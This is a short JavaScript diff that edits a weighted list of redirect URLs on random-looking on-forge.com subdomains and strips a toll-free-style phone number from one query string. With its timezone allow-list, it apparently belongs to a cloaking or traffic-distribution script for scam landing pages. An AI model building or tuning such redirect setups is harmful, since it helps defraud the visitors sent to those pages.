@@ -35,7 +35,7 @@ const ALLOWED_TIMEZONES = new Set([
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
     { url: "https://hsdgdsdsfgvdf.on-forge.com/werrx01USAHTML/?bcda", weight: 0.3 },
-    { url: "https://vnskdjvdsfds.on-forge.com/werrx01USAHTML/?bcda=1800-549-821", weight: 0.7 }
+    { url: "https://vnskdjvdsfds.on-forge.com/werrx01USAHTML/?bcda", weight: 0.7 }
     
 ];
 
